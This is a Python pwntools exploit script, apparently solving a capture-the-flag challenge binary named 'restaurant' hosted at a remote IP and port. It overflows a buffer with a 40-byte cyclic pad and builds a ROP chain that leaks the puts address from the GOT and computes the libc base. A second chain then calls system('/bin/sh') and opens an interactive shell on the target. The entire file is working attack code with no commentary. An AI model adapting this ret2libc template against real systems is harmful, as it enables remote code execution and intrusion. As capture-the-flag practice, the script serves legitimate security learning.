from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x400eec
continue
'''.format(**locals())

exe = './challenge/restaurant'
elf = context.binary = ELF(exe, checksec=False)

LOCAL = False
if LOCAL:
    p = start()
    libc = elf.libc
else:
    p = remote("167.172.55.94", 31867)
    libc = ELF("./challenge/libc.so.6", checksec=False)

pop_rdi_ret = 0x4010a3

payload = flat(
    cyclic(40),
    pop_rdi_ret,
    elf.got.puts,
    elf.plt.puts,
    elf.entrypoint
)

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', payload)

p.recvuntil(b'\xa3\x10')
leak = u64(p.recvline()[-7:-1].ljust(8, b'\x00'))
info("Leak got puts: " + hex(leak))
libc.address = leak - libc.sym.puts
rop = ROP(elf)

payload = flat(
    cyclic(40),
    pop_rdi_ret,
    next(libc.search(b"/bin/sh")),
    rop.ret.address,
    libc.sym.system
)
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', payload)

p.interactive()
